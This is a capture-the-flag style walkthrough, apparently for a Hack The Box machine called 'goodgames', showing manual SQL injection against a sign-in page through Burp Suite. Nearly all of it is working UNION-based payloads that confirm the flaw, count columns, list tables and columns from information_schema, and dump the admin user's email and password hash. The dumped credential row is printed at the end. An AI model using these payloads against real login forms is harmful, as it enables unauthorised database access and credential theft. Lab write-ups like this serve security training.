**A tutorial for manually exploiting sqli in the sign in page without sqlmap but with burpsuite**

![image](https://user-images.githubusercontent.com/87831546/142857492-a15dd841-8ef9-47b4-b074-ff0827e1c11d.png)

1) Confirm sql injection ('# comments out any query after it):
```
email=a@a.com'#
```
![image](https://user-images.githubusercontent.com/87831546/142857635-483e64f9-b383-48e3-a81a-ae49017f7460.png)

2) Find number of columns with ORDER BY, increasing the order of numbers until we get an error
```
email=a@a.com' order by 4-- -&password=esdfs
```
order by 4 works, but order by 5 gives us an error telling us that there are 4 columns
![image](https://user-images.githubusercontent.com/87831546/142857961-b7333efa-0fae-47b9-b8fe-cbe2a87aa4d5.png)
![image](https://user-images.githubusercontent.com/87831546/142858071-7ec1ede4-8bae-4831-aef8-bada640b2bd2.png)

3) Find columns with useful data type to see if we can see the outcome of queries. We find that only the last column displays output to use
```
email=a@.com' UNION SELECT NULL,NULL,NULL,'test'-- -&password=esdfs
```
![image](https://user-images.githubusercontent.com/87831546/142858377-8c3d41cc-6858-42b1-8b05-706eb6dfa9e5.png)

4) Find databse names - gives us an interesting table name called 'user'
```
email=a@a.com' UNION SELECT NULL,NULL,NULL,table_name FROM information_schema.tables -- -&password=esdfs
```
![image](https://user-images.githubusercontent.com/87831546/142858532-ceff2ce1-5b8b-47dc-97e4-5eba5ef5e9a5.png)

5) Find columns for the user data (id, email, password, name)
```
email=a%40a.com' UNION SELECT NULL,NULL,NULL,column_name FROM information_schema.columns WHERE table_name='user'-- -&password=esdfs
```
![image](https://user-images.githubusercontent.com/87831546/142858926-da72f95e-3649-49e9-8ad8-c8b304877291.png)


6) Find that an admin user exists
```
email=a%40a.com' UNION SELECT NULL,NULL,NULL,name FROM user-- -&password=esdfs
```
(returns two users, admin and a. a is a user i registered on the site)
![image](https://user-images.githubusercontent.com/87831546/142859633-5bfb8a1e-ed6c-44b0-9ca3-90b23986dad3.png)

7) Dump the email and password from the admin user
```
email=a%40a.com' UNION SELECT NULL,NULL,NULL,email FROM user WHERE name='admin'-- -&password=esdfs
```
![image](https://user-images.githubusercontent.com/87831546/142859858-88a6fcae-13dc-4b35-bf97-134547a10047.png)

```
email=a%40a.com' UNION SELECT NULL,NULL,NULL,password FROM user WHERE name='admin'-- -&password=esdfs
```
![image](https://user-images.githubusercontent.com/87831546/142859540-67379753-b541-47ce-a866-2e2b1f81f0ce.png)

And we get the same data that sqlmap gave us!
```
+------+---------------------+--------+----------------------------------+
| id   | email               | name   | password                         |
+------+---------------------+--------+----------------------------------+
| 1    | admin@goodgames.htb | admin  | 2b22337f218b2d82dfc3b6f77e7cb8ec |
+------+---------------------+--------+----------------------------------+
```

One thing to note is that all results seem to strangely precede with an 'a', just miss this out of all results
